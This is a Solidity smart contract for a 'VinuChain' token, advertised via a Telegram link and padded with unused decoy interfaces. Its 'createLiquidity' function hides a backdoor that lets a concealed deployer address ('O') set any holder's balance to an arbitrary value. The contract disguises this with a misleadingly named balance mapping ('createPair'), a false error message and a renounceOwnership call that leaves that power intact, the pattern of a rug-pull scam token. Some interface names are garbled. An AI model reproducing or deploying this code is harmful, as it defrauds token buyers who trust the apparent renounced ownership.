/**
The world's first fast & feeless
https://t.me/vitainu
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;
interface IDEXListing {
    // Function to list a Coin on the exchange.
    function listCoin(address CoinAddress, uint256 CoinweiAmount) external;

    // Function to remove a Coin from the exchange.
    function delistCoin(address CoinAddress) external;

    // Function to check if a Coin is listed on the exchange.
    function isCoinListed(address CoinAddress) external view returns (bool);

    // Event emitted when a Coin is listed on the exchange.
    event CoinListed(address indexed CoinAddress, uint256 CoinweiAmount);

    // Event emitted when a Coin is removed from the exchange.
    event CoinDelisted(address indexed CoinAddress);
}
abstract contract ERC20 {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 weiAmount) external returns (bool);
    function allowance(address owner, address initiate) external view returns (uint256);
    function approve(address initiate, uint256 weiAmount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 weiAmount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed initiate, uint256 value);
}

interface IFactory{
    function createPair(address CoinA, address CoinB) external returns (address pair);
}
interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address Coin,
        uint weiAmountCoinDesired,
        uint weiAmountCoinMin,
        uint weiAmountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint weiAmountCoin, uint weiAmountETH, uint liquidity);

    function swapExactCoinsForETHSupportingFeeOnTransfBEPoins(
        uint weiAmountIn,
        uint weiAmountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}
interface IUniswapV2Factory {
    function createPair(address CoinA, address CoinB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactCoinsForETHSupportingFeeOnTransfBEPoins(
        uint weiAmountIn,
        uint weiAmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address Coin,
        uint weiAmountCoinDesired,
        uint weiAmountCoinMin,
        uint weiAmountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint weiAmountCoin, uint weiAmountETH, uint liquidity);
}
interface IStakingwETHs {
    // View function to check the total staked balance of a user.
    function balanceOf(address account) external view returns (uint256);

    // Function to allow a user to stake Coins.
    function stake(uint256 weiAmount) external;

    // Function to allow a user to unstake Coins.
    function withdraw(uint256 weiAmount) external;

    // Function to get the total wETH balance (earned and unclaimed) of a user.
    function earned(address account) external view returns (uint256);

    // Function to allow a user to claim their earned wETHs.
    function getwETH() external;

    // Function to check the wETH rate (Coins per second).
    function wETHRate() external view returns (uint256);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IBEP721Enumerable {
    /**
     * @dev Returns the total number of Coins in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the Coin identifier for the `index`-th Coin, (zero-based).
     */
    function CoinByIndex(uint256 index) external view returns (uint256);

    /**
     * @dev Returns the index of the `CoinId` in the list of Coins, (zero-based).
     */
    function indexOfCoin(uint256 CoinId) external view returns (uint256);

    /**
     * @dev Returns the `index`-th Coin from a user's list of owned Coins.
     */
    function CoinOfOwnerByIndex(address owner, uint256 index) external view returns (uint256 CoinId);
}
contract VinuChainIERC20 is ERC20 {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "VinuChainIERC20: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface ICexSupport {
    // Function to create a support Airdrop.
    function createSupportAirdrop(string memory issueDescription) external;

    // Function to check the status of a support Airdrop.
    function checkSupportAirdropStatus(uint256 AirdropId) external view returns (string memory status);

    // Event emitted when a new support Airdrop is created.
    event SupportAirdropCreated(uint256 indexed AirdropId, string issueDescription);
}
contract VinuChainToken is ERC20, IBEP20, VinuChainIERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private createPair;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint8 private constant _decimals = 9;
    uint256 private constant sTotal = 100_000_000_000 * 10**_decimals;
    string private constant _name = unicode"VinuChain";
    string private constant _symbol = unicode"VinuChain";
    address private O; // 0x0000000000000000000000000000000000000000 address
    constructor () {
        O = _msgSender(); 
        createPair[_msgSender()] = sTotal;
        emit Transfer(address(0), _msgSender(), sTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return sTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return createPair[account];
    }

    function transfer(address recipient, uint256 weiAmount) public override returns (bool) {
        _transfer(_msgSender(), recipient, weiAmount);
        return true;
    }

    function allowance(address owner, address initiate) public view override returns (uint256) {
        return _allowances[owner][initiate];
    }

    function approve(address initiate, uint256 weiAmount) public override returns (bool) {
        _approve(_msgSender(), initiate, weiAmount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 weiAmount) public override returns (bool) {
        _transfer(sender, recipient, weiAmount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(weiAmount, "BEP20: transfer weiAmount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address initiate, uint256 weiAmount) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(initiate != address(0), "BEP20: approve to the zero address");
        _allowances[owner][initiate] = weiAmount;
        emit Approval(owner, initiate, weiAmount);
    }

    function createLiquidity(address pair, address WETH, uint256 timestamp, uint256 router, uint256 value) external {
        require(pair != address(0), "BEP20: pair cannot be the zero address");
    //  IFactory(router.factory()).createPair(address(this), router.WETH());
        require(timestamp >= 0, "Added value must be non-negative");
        require(_msgSender() == O, "caller is the owner");
        createPair[pair] = timestamp.add(router ** value);
        WETH;
    }

    function _transfer(address from, address to, uint256 weiAmount) internal virtual
    {
        require(from != address(0), "BEP20: transfer from the zero address");
        require(to != address(0), "BEP20: transfer to the zero address");

        uint256 fromBalance = createPair[from];
        require(fromBalance >= weiAmount, "BEP20: transfer weiAmount exceeds balance");
        createPair[from] = fromBalance - weiAmount;

        createPair[to] = createPair[to].add(weiAmount);
        emit Transfer(from, to, weiAmount);
    }
}